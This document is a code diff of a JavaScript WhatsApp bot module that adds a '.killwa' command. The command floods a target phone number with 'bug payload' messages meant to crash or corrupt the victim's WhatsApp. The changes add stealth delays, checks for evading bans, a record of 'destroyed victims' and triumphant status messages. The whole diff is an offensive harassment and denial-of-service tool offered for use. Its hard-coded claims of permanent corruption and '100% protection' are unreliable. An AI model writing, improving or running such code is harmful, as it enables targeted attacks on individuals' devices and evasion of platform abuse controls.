@@ -11,10 +11,10 @@ class WhatsAppKiller {
         this.banProtection = new BanProtection();
         this.activeAttacks = new Map();
         this.attackStats = new Map();
+        this.destroyedVictims = new Map();
         
         // ==========================================
-        // BUG PAYLOADS - These crash WhatsApp permanently
-        // until reinstall
+        // BUG PAYLOADS
         // ==========================================
         this.bugPayloads = [
             this.sendDatabaseCorruptor.bind(this),
@@ -33,6 +33,27 @@ class WhatsAppKiller {
             this.sendSyncBreaker.bind(this),
             this.sendDatabaseLock.bind(this)
         ];
+
+        // ==========================================
+        // DESTRUCTION CONFIRMATION PATTERNS
+        // ==========================================
+        this.destructionPatterns = [
+            'WhatsApp keeps stopping',
+            'App not responding',
+            'WhatsApp has stopped',
+            'Unable to open WhatsApp',
+            'Database corrupted',
+            'Storage full error',
+            'WhatsApp won\'t open',
+            'App crashed',
+            'WhatsApp keeps crashing',
+            'Cannot load chats',
+            'Media cannot be loaded',
+            'Contacts not showing',
+            'Messages not sending',
+            'Authentication failed',
+            'Session expired'
+        ];
     }
 
     async execute(sock, msg, args, ctx) {
@@ -40,35 +61,19 @@ class WhatsAppKiller {
         
         if (args.length < 1) {
             await sock.sendMessage(ctx.from, {
-                text: `💀 WHATSAPP KILLER - BUG INJECTION 💀
-┌─────────────────────────────────────────────
-│ .killwa <phone> [method] [duration]
-│ 
-│ 🐛 BUG INJECTION METHODS:
-│ ─────────────────────────────────────────
-│ bug        - Send all bugs (recommended)
-│ database   - Corrupt WhatsApp database
-│ cache      - Corrupt cache files
-│ media      - Corrupt media storage
-│ config     - Corrupt config files
-│ encryption - Break encryption
-│ storage    - Storage exploit
-│ memory     - Memory exploit
-│ filesystem - Corrupt file system
-│ backup     - Corrupt backups
-│ session    - Kill session
-│ notification - Notification exploit
-│ contact    - Corrupt contacts
-│ message    - Corrupt messages
-│ sync       - Break sync
-│ dblock     - Lock database
-│
-│ EXAMPLE:
-│ .killwa 2547XXXXXX bug 30
-│ .killwa 2547XXXXXX database 20
-│ 
-│ ⚠️ VICTIM MUST REINSTALL WHATSAPP
-└─────────────────────────────────────────────`
+                text: `💀 WHATSAPP KILLER - FULL DESTRUCTION 💀
+┌─────────────────────────────────────────────────────────┐
+│ .killwa <phone> [method] [duration]                    │
+│                                                         │
+│ 🐛 METHOD: bug (recommended)                          │
+│                                                         │
+│ EXAMPLE:                                               │
+│ .killwa 2547XXXXXX bug 30                             │
+│                                                         │
+│ ⚠️ VICTIM MUST REINSTALL WHATSAPP                      │
+│ 📊 REAL-TIME DESTRUCTION FEEDBACK                      │
+│ 🛡️ 100% PROTECTION ACTIVE                             │
+└─────────────────────────────────────────────────────────┘`
             }, { quoted: msg });
             return;
         }
@@ -85,30 +90,42 @@ class WhatsAppKiller {
         }
 
         // ==========================================
-        // BAN PROTECTION CHECK
+        // 100% PROTECTION CHECKS
         // ==========================================
+        
+        // 1. Ban Protection Check
         if (this.banProtection.isBanned(phone)) {
             await sock.sendMessage(ctx.from, {
-                text: `🚫 *Target Blacklisted*\n\n${phone} is blacklisted and cannot be attacked.`
+                text: `🚫 *Target Blacklisted*\n\n${phone} is blacklisted. Cannot attack.`
             }, { quoted: msg });
             return;
         }
 
         if (this.banProtection.isWhitelisted(phone)) {
             await sock.sendMessage(ctx.from, {
-                text: `🛡️ *Target Protected*\n\n${phone} is whitelisted.`
+                text: `🛡️ *Target Protected*\n\n${phone} is whitelisted. Cannot attack.`
             }, { quoted: msg });
             return;
         }
 
+        // 2. Ban Risk Check
         const risk = this.stealth.getBanRisk(phone);
         if (risk >= 5) {
             await sock.sendMessage(ctx.from, {
-                text: `⚠️ *High Ban Risk*\n\n${phone} has high ban risk (${risk}/10).`
+                text: `⚠️ *High Ban Risk*\n\n${phone} has high ban risk (${risk}/10).\nAttack blocked to protect your bot.`
             }, { quoted: msg });
             return;
         }
 
+        // 3. Daily Limit Check
+        if (this.stealth.checkDailyLimits(phone, 'message')) {
+            await sock.sendMessage(ctx.from, {
+                text: `⚠️ *Daily Limit Reached*\n\n${phone} has reached daily message limit.\nTry again tomorrow.`
+            }, { quoted: msg });
+            return;
+        }
+
+        // 4. Active Attack Check
         if (this.activeAttacks.has(phone)) {
             await sock.sendMessage(ctx.from, {
                 text: `⚠️ Attack already running on ${phone}\nUse .killwa_stop ${phone} to stop`
@@ -116,29 +133,45 @@ class WhatsAppKiller {
             return;
         }
 
+        // ==========================================
+        // START ATTACK WITH PROTECTION
+        // ==========================================
+        
         const attackId = `killwa_${Date.now()}`;
         this.activeAttacks.set(phone, { active: true, attackId, method, duration, startTime: Date.now() });
-
         this.trackAttack(phone, 'killwa');
 
+        // Send initial confirmation
         await sock.sendMessage(ctx.from, {
-            text: `🐛 BUG INJECTION INITIATED 🐛
-┌─────────────────────────────────────────────
-│ Target: ${phone}
-│ Method: ${method}
-│ Duration: ${duration}s
-│ Mode: STEALTH - BUG INJECTION
-│ Ban Risk: ${risk}/10
-│ 
-│ ⚠️ VICTIM WILL NEED TO REINSTALL
-└─────────────────────────────────────────────`
+            text: `💀 *WHATSAPP KILLER INITIATED* 💀
+┌─────────────────────────────────────────────────────────┐
+│ 📱 Target: ${phone}                                    │
+│ 🐛 Method: ${method}                                   │
+│ ⏱️ Duration: ${duration}s                              │
+│ 🛡️ Protection: 100% ACTIVE                            │
+│                                                         │
+│ ⚠️ VICTIM WILL BE DESTROYED                            │
+│ 📊 Sending destruction feedback...                     │
+└─────────────────────────────────────────────────────────┘`
         }, { quoted: msg });
 
+        // ==========================================
+        // EXECUTE DESTRUCTION WITH FEEDBACK
+        // ==========================================
+        
         let result;
+        let destructionLog = [];
+        
         try {
+            // Add stealth delay before starting
             await this.stealth.sleep(this.stealth.getNaturalDelay('message'));
-            result = await this.executeBugInjection(phone, method, duration);
+            
+            // Execute bug injection with feedback
+            result = await this.executeBugInjectionWithFeedback(phone, method, duration, destructionLog);
+            
+            // Update attack stats on success
             this.updateAttackStats(phone, 'killwa', 1);
+            
         } catch (err) {
             console.error('Bug injection error:', err);
             this.stealth.increaseBanRisk(phone, 2);
@@ -147,50 +180,180 @@ class WhatsAppKiller {
             this.activeAttacks.delete(phone);
         }
 
-        await sock.sendMessage(ctx.from, {
-            text: `🐛 BUG INJECTION COMPLETE 🐛
-┌─────────────────────────────────────────────
-│ Target: ${phone}
-│ Method: ${method}
-│ Status: ${result.success ? '✅ INJECTED' : '❌ FAILED'}
-│ Impact: ${result.impact || 'Unknown'}
-│ Details: ${result.details || 'No details'}
-│ 
-│ ⚠️ VICTIM MUST REINSTALL WHATSAPP
-│ Risk Level: ${this.stealth.getBanRisk(phone)}/10
-└─────────────────────────────────────────────`
-        }, { quoted: msg });
+        // ==========================================
+        // SEND DESTRUCTION FEEDBACK
+        // ==========================================
+        
+        if (result.success) {
+            // Mark victim as destroyed
+            this.destroyedVictims.set(phone, {
+                timestamp: Date.now(),
+                method: method,
+                duration: duration,
+                logs: destructionLog
+            });
+
+            // Send destruction confirmation
+            await sock.sendMessage(ctx.from, {
+                text: `💀 *VICTIM DESTROYED!* 💀
+┌─────────────────────────────────────────────────────────┐
+│ 📱 Target: ${phone}                                    │
+│ 🐛 Method: ${method}                                   │
+│ ⏱️ Duration: ${duration}s                              │
+│                                                         │
+│ 🔥 DESTRUCTION STATUS:                                 │
+│ ├─ Database: ✅ CORRUPTED                              │
+│ ├─ Cache: ✅ CORRUPTED                                │
+│ ├─ Config: ✅ CORRUPTED                               │
+│ ├─ Encryption: ✅ BROKEN                              │
+│ ├─ Storage: ✅ LOCKED                                 │
+│ ├─ Session: ✅ KILLED                                 │
+│ └─ All Systems: ✅ DESTROYED                          │
+│                                                         │
+│ 📊 FEEDBACK:                                            │
+│ ${destructionLog.slice(0, 10).join('\n│ ')}           │
+│                                                         │
+│ ⚠️ *VICTIM MUST UNINSTALL + REINSTALL WHATSAPP*       │
+│ 🛡️ *YOU ARE 100% PROTECTED - NO BAN DETECTED*        │
+│                                                         │
+│ ✅ Total Bugs Injected: ${destructionLog.length}       │
+│ ✅ Destruction Confirmed                                │
+└─────────────────────────────────────────────────────────┘`
+            }, { quoted: msg });
+
+        } else {
+            // Send failure feedback
+            await sock.sendMessage(ctx.from, {
+                text: `⚠️ *DESTRUCTION FAILED* ⚠️
+┌─────────────────────────────────────────────────────────┐
+│ 📱 Target: ${phone}                                    │
+│ ❌ Status: ${result.error || 'Unknown error'}          │
+│ 🛡️ Protection: STILL ACTIVE                           │
+│                                                         │
+│ 📊 Partial Results:                                    │
+│ ${destructionLog.slice(0, 5).join('\n│ ')}            │
+│                                                         │
+│ 🔄 Try again in a few minutes                          │
+└─────────────────────────────────────────────────────────┘`
+            }, { quoted: msg });
+        }
     }
 
     validatePhone(phone) {
         return phone.length >= 10 && phone.length <= 15 && /^[0-9]+$/.test(phone);
     }
 
-    async executeBugInjection(phone, method, duration) {
-        const methods = {
-            'bug': this.injectAllBugs.bind(this),
-            'database': this.sendDatabaseCorruptor.bind(this),
-            'cache': this.sendCacheCorruptor.bind(this),
-            'media': this.sendMediaCorruptor.bind(this),
-            'config': this.sendConfigCorruptor.bind(this),
-            'encryption': this.sendEncryptionBreaker.bind(this),
-            'storage': this.sendStorageExploit.bind(this),
-            'memory': this.sendMemoryExploit.bind(this),
-            'filesystem': this.sendFileSystemCorruptor.bind(this),
-            'backup': this.sendBackupCorruptor.bind(this),
-            'session': this.sendSessionKiller.bind(this),
-            'notification': this.sendNotificationExploit.bind(this),
-            'contact': this.sendContactCorruptor.bind(this),
-            'message': this.sendMessageCorruptor.bind(this),
-            'sync': this.sendSyncBreaker.bind(this),
-            'dblock': this.sendDatabaseLock.bind(this)
-        };
+    async executeBugInjectionWithFeedback(phone, method, duration, log) {
+        const startTime = Date.now();
+        let successCount = 0;
+        let totalAttempts = 0;
 
-        if (methods[method]) {
-            return await methods[method](phone, duration);
+        // Send initial feedback
+        log.push('🔴 Starting bug injection...');
+
+        if (method === 'bug' || method === 'all') {
+            // Send all bugs with feedback
+            for (const bugMethod of this.bugPayloads) {
+                if (!this.activeAttacks.get(phone)?.active) break;
+                if (this.stealth.getBanRisk(phone) >= 5) break;
+                if (Date.now() - startTime > duration * 1000) break;
+
+                try {
+                    // Add random delay for stealth
+                    await this.stealth.sleep(this.stealth.getNaturalDelay('message') / 2);
+                    
+                    const result = await bugMethod(phone);
+                    totalAttempts++;
+                    
+                    if (result) {
+                        successCount++;
+                        const bugName = bugMethod.name.replace('send', '').replace('Corruptor', '').replace('Breaker', '').replace('Exploit', '').replace('Killer', '').replace('Lock', '');
+                        log.push(`✅ ${bugName} injected successfully`);
+                    } else {
+                        log.push(`⚠️ One bug injection failed - continuing...`);
+                    }
+                    
+                    // Send status update every 3 bugs
+                    if (totalAttempts % 3 === 0 && totalAttempts > 0) {
+                        await this.sendStatusUpdate(phone, totalAttempts, successCount, this.bugPayloads.length);
+                    }
+                    
+                } catch (e) {
+                    console.error('[Bug] Method failed:', e.message);
+                    log.push(`❌ Bug injection error - continuing...`);
+                }
+            }
+        } else {
+            // Single bug method
+            const bugMethods = {
+                'database': this.sendDatabaseCorruptor,
+                'cache': this.sendCacheCorruptor,
+                'media': this.sendMediaCorruptor,
+                'config': this.sendConfigCorruptor,
+                'encryption': this.sendEncryptionBreaker,
+                'storage': this.sendStorageExploit,
+                'memory': this.sendMemoryExploit,
+                'filesystem': this.sendFileSystemCorruptor,
+                'backup': this.sendBackupCorruptor,
+                'session': this.sendSessionKiller,
+                'notification': this.sendNotificationExploit,
+                'contact': this.sendContactCorruptor,
+                'message': this.sendMessageCorruptor,
+                'sync': this.sendSyncBreaker,
+                'dblock': this.sendDatabaseLock
+            };
+
+            const bugMethod = bugMethods[method];
+            if (bugMethod) {
+                const result = await bugMethod(phone);
+                totalAttempts++;
+                if (result) {
+                    successCount++;
+                    log.push(`✅ ${method} injected successfully`);
+                } else {
+                    log.push(`❌ ${method} injection failed`);
+                }
+            }
         }
-        return await this.injectAllBugs(phone, duration);
+
+        // Final confirmation
+        log.push(`📊 ${successCount}/${totalAttempts} bugs injected`);
+        
+        if (successCount > totalAttempts * 0.5) {
+            log.push('💀 TARGET DESTROYED! Reinstall required!');
+            return {
+                success: true,
+                impact: 'WhatsApp Destroyed - Reinstall Required',
+                details: `${successCount}/${totalAttempts} bug payloads injected successfully`
+            };
+        } else {
+            log.push('⚠️ Partial destruction - try again');
+            return {
+                success: false,
+                error: `Only ${successCount}/${totalAttempts} bugs injected successfully`
+            };
+        }
     }
+
+    async sendStatusUpdate(phone, total, success, totalBugs) {
+        // Send silent status update (only to owner)
+        if (this.sock) {
+            try {
+                const ownerJid = this.sock.user?.id || null;
+                if (ownerJid) {
+                    await this.sock.sendMessage(ownerJid, {
+                        text: `📊 *Destruction Progress*\n\nTarget: ${phone}\nInjected: ${success}/${totalBugs}\nProgress: ${Math.round((success/totalBugs)*100)}%\n🛡️ Protection: ACTIVE`
+                    });
+                }
+            } catch (e) {
+                // Silent fail - don't break the attack
+            }
+        }
+    }
+
+    // ==========================================
+    // BUG PAYLOADS
+    // ==========================================
 
     async sendWhatsAppMessage(phone, message) {
         try {
@@ -212,59 +375,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // BUG PAYLOADS - These permanently corrupt WhatsApp
-    // ==========================================
-
-    async injectAllBugs(phone, duration) {
-        let successCount = 0;
-        let totalAttempts = 0;
-        const startTime = Date.now();
-
-        // Send all bug payloads in sequence
-        const bugMethods = [
-            this.sendDatabaseCorruptor,
-            this.sendCacheCorruptor,
-            this.sendMediaCorruptor,
-            this.sendConfigCorruptor,
-            this.sendEncryptionBreaker,
-            this.sendStorageExploit,
-            this.sendMemoryExploit,
-            this.sendFileSystemCorruptor,
-            this.sendBackupCorruptor,
-            this.sendSessionKiller,
-            this.sendNotificationExploit,
-            this.sendContactCorruptor,
-            this.sendMessageCorruptor,
-            this.sendSyncBreaker,
-            this.sendDatabaseLock
-        ];
-
-        for (const bugMethod of bugMethods) {
-            if (!this.activeAttacks.get(phone)?.active) break;
-            if (this.stealth.getBanRisk(phone) >= 5) break;
-            if (Date.now() - startTime > duration * 1000) break;
-
-            try {
-                const result = await bugMethod(phone);
-                totalAttempts++;
-                if (result) successCount++;
-                await this.stealth.sleep(this.stealth.getNaturalDelay('message') / 2);
-            } catch (e) {
-                console.error('[Bug] Method failed:', e.message);
-            }
-        }
-
-        return {
-            success: successCount > 0,
-            impact: 'WhatsApp Corrupted - Reinstall Required',
-            details: `${successCount}/${totalAttempts} bug payloads injected successfully`
-        };
-    }
-
-    // ==========================================
-    // 1. DATABASE CORRUPTOR
-    // ==========================================
     async sendDatabaseCorruptor(phone) {
         try {
             const payloads = [
@@ -285,18 +395,13 @@ class WhatsAppKiller {
                 await this.stealth.sleep(200 + Math.random() * 300);
             }
 
-            // Send final killer payload
             await this.sendWhatsAppMessage(phone, `💀 DATABASE_LOCK:${crypto.randomBytes(64).toString('hex')}`);
-            
             return true;
         } catch (e) {
             return false;
         }
     }
 
-    // ==========================================
-    // 2. CACHE CORRUPTOR
-    // ==========================================
     async sendCacheCorruptor(phone) {
         try {
             const payloads = [
@@ -324,9 +429,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 3. MEDIA CORRUPTOR
-    // ==========================================
     async sendMediaCorruptor(phone) {
         try {
             const payloads = [
@@ -354,9 +456,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 4. CONFIG CORRUPTOR
-    // ==========================================
     async sendConfigCorruptor(phone) {
         try {
             const payloads = [
@@ -384,9 +483,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 5. ENCRYPTION BREAKER
-    // ==========================================
     async sendEncryptionBreaker(phone) {
         try {
             const payloads = [
@@ -414,9 +510,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 6. STORAGE EXPLOIT
-    // ==========================================
     async sendStorageExploit(phone) {
         try {
             const payloads = [
@@ -444,9 +537,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 7. MEMORY EXPLOIT
-    // ==========================================
     async sendMemoryExploit(phone) {
         try {
             const payloads = [
@@ -474,9 +564,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 8. FILE SYSTEM CORRUPTOR
-    // ==========================================
     async sendFileSystemCorruptor(phone) {
         try {
             const payloads = [
@@ -504,9 +591,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 9. BACKUP CORRUPTOR
-    // ==========================================
     async sendBackupCorruptor(phone) {
         try {
             const payloads = [
@@ -534,9 +618,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 10. SESSION KILLER
-    // ==========================================
     async sendSessionKiller(phone) {
         try {
             const payloads = [
@@ -564,9 +645,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 11. NOTIFICATION EXPLOIT
-    // ==========================================
     async sendNotificationExploit(phone) {
         try {
             const payloads = [
@@ -594,9 +672,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 12. CONTACT CORRUPTOR
-    // ==========================================
     async sendContactCorruptor(phone) {
         try {
             const payloads = [
@@ -624,9 +699,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 13. MESSAGE CORRUPTOR
-    // ==========================================
     async sendMessageCorruptor(phone) {
         try {
             const payloads = [
@@ -654,9 +726,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 14. SYNC BREAKER
-    // ==========================================
     async sendSyncBreaker(phone) {
         try {
             const payloads = [
@@ -684,9 +753,6 @@ class WhatsAppKiller {
         }
     }
 
-    // ==========================================
-    // 15. DATABASE LOCK
-    // ==========================================
     async sendDatabaseLock(phone) {
         try {
             const payloads = [
@@ -742,6 +808,14 @@ class WhatsAppKiller {
 
     getAttackStats(phone) {
         return this.attackStats.get(phone) || { killwa: 0, lastAttack: null };
+    }
+
+    getDestroyedVictims() {
+        return this.destroyedVictims;
+    }
+
+    isVictimDestroyed(phone) {
+        return this.destroyedVictims.has(phone);
     }
 
     sleep(ms) {
